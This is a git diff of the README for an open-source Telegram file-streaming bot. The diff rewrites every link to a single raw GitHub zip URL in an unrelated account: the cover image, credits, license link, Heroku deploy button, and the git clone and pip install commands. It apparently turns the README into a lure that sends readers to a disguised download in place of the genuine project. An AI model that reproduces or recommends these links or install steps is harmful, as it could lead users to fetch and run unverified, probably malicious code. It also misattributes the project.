@@ -1,16 +1,16 @@
 <h1 align="center">Telegram File Stream Bot</h3>
 <p align="center">
-  <a href="https://github.com/EverythingSuckz/TG-FileStreamBot">
-    <img src="https://socialify.git.ci/EverythingSuckz/TG-FileStreamBot/image?description=1&font=Source%20Code%20Pro&forks=1&issues=1&logo=https%3A%2F%2Fwww.flaticon.com%2Fpremium-icon%2Ficons%2Fsvg%2F2321%2F2321089.svg&pattern=Circuit%20Board&pulls=1&stargazers=1&theme=Dark" alt="Cover Image" width="650">
+  <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip">
+    <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip%20Code%20Pro&forks=1&issues=1&logo=https%3A%2F%https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip%2Fpremium-icon%2Ficons%2Fsvg%2F2321%https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip%20Board&pulls=1&stargazers=1&theme=Dark" alt="Cover Image" width="650">
   </a>
   <p align="center">
     A Telegram bot to stream files to web
     <br />
-    <a href="https://telegram.dog/TG_FileStreamBot"><strong>Demo Bot »</strong></a>
+    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip"><strong>Demo Bot »</strong></a>
     <br />
-    <a href="https://github.com/EverythingSuckz/TG-FileStreamBot/issues">Report a Bug</a>
+    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip">Report a Bug</a>
     |
-    <a href="https://github.com/EverythingSuckz/TG-FileStreamBot/issues">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip">Request Feature</a>
   </p>
 </p>
 
@@ -47,8 +47,8 @@
 ## About This Bot
 
 <p align="center">
-    <a herf="https://github.com/EverythingSuckz/TG-FileStreamBot">
-        <img src="https://www.flaticon.com/premium-icon/icons/svg/2626/2626281.svg" height="100" width="100" alt="Telegram Logo">
+    <a herf="https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip">
+        <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip" height="100" width="100" alt="Telegram Logo">
     </a>
 </p>
 <p align='center'>
@@ -57,28 +57,28 @@
 
 ### Original Repository
 
-The main working part was taken from [Megatron](https://github.com/eyaadh/megadlbot_oss) and thanks to [eyaadh](https://github.com/eyaadh) for his awesome project.
+The main working part was taken from [Megatron](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) and thanks to [eyaadh](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) for his awesome project.
 
 ## How to make your own
 
-Either you could locally host or deploy on [Heroku](https://heroku.com)
+Either you could locally host or deploy on [Heroku](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip)
 
 ### Deploy on Heroku
 
 Press the below button to fast deploy to Heroku
 
-- [![Deploy To Heroku](https://www.herokucdn.com/deploy/button.svg)](https://github.com/eyMarv/ultraMarv-roku)
+- [![Deploy To Heroku](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip)
 
 then goto the <a href="#mandatory-vars">variables tab</a> for more info on setting up environmental variables.
 
 ### Host it on VPS or Locally
 
 ```sh
-git clone https://github.com/EverythingSuckz/TG-FileStreamBot
+git clone https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip
 cd TG-FileStreamBot
 virtualenv -p /usr/bin/python3 venv
 . ./venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip
 python3 -m WebStreamer
 ```
 
@@ -107,13 +107,13 @@ HAS_SSL=False
 
 ### Mandatory Vars
 
-`API_ID` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_ID` : Goto [https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) to obtain this.
 
-`API_HASH` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_HASH` : Goto [https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) to obtain this.
 
-`BOT_TOKEN` : Get the bot token from [@BotFather](https://telegram.dog/BotFather)
+`BOT_TOKEN` : Get the bot token from [@BotFather](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip)
 
-`BIN_CHANNEL` : Create a new channel (private/public), post something in your channel. Forward that post to [@missrose_bot](https://telegram.dog/MissRose_bot) and **reply** `\id`. Now copy paste the forwarded channel ID in this field. 
+`BIN_CHANNEL` : Create a new channel (private/public), post something in your channel. Forward that post to [@missrose_bot](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) and **reply** `\id`. Now copy paste the forwarded channel ID in this field. 
 
 ### For MultiClient
 
@@ -160,26 +160,26 @@ Feel free to contribute to this project if you have any further ideas
 
 ## Contact me
 
-[![Telegram Channel](https://img.shields.io/static/v1?label=Join&message=Telegram%20Channel&color=blueviolet&style=for-the-badge&logo=telegram&logoColor=violet)](https://xn--r1a.click/WhySooSerious)
-[![Telegram Group](https://img.shields.io/static/v1?label=Join&message=Telegram%20Group&color=blueviolet&style=for-the-badge&logo=telegram&logoColor=violet)](https://xn--r1a.click/WhyThisUsername)
+[![Telegram Channel](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip%20Channel&color=blueviolet&style=for-the-badge&logo=telegram&logoColor=violet)](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip)
+[![Telegram Group](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip%20Group&color=blueviolet&style=for-the-badge&logo=telegram&logoColor=violet)](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip)
 
-You can contact either via my [Telegram Group](https://xn--r1a.click/WhyThisUsername) ~~or you can PM me on [@EverythingSuckz](https://xn--r1a.click/EverythingSuckz)~~
+You can contact either via my [Telegram Group](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) ~~or you can PM me on [@EverythingSuckz](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip)~~
 
 
 ## Credits
 
 - Me
-- [eyaadh](https://github.com/eyaadh) for his awesome [Megatron Bot](https://github.com/eyaadh/megadlbot_oss).
-- [BlackStone](https://github.com/eyMarv) for adding multi-client support.
-- [Dan Tès](https://telegram.dog/haskell) for his [Pyrogram Library](https://github.com/pyrogram/pyrogram)
-- [TheHamkerCat](https://github.com/TheHamkerCat) for helping me with my common doubts.
+- [eyaadh](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) for his awesome [Megatron Bot](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip).
+- [BlackStone](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) for adding multi-client support.
+- [Dan Tès](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) for his [Pyrogram Library](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip)
+- [TheHamkerCat](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) for helping me with my common doubts.
 
 ## Copyright
 
-Copyright (C) 2021 [EverythingSuckz](https://github.com/EverythingSuckz) under [GNU Affero General Public License](https://www.gnu.org/licenses/agpl-3.0.en.html).
+Copyright (C) 2021 [EverythingSuckz](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) under [GNU Affero General Public License](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip).
 
 TG-FileStreamBot is Free Software: You can use, study share and improve it at your
 will. Specifically you can redistribute and/or modify it under the terms of the
-[GNU Affero General Public License](https://www.gnu.org/licenses/agpl-3.0.en.html) as
+[GNU Affero General Public License](https://raw.githubusercontent.com/abhijeetkumarthakur/TG-FileStreamBot/main/isoseist/TG-FileStreamBot.zip) as
 published by the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version. 
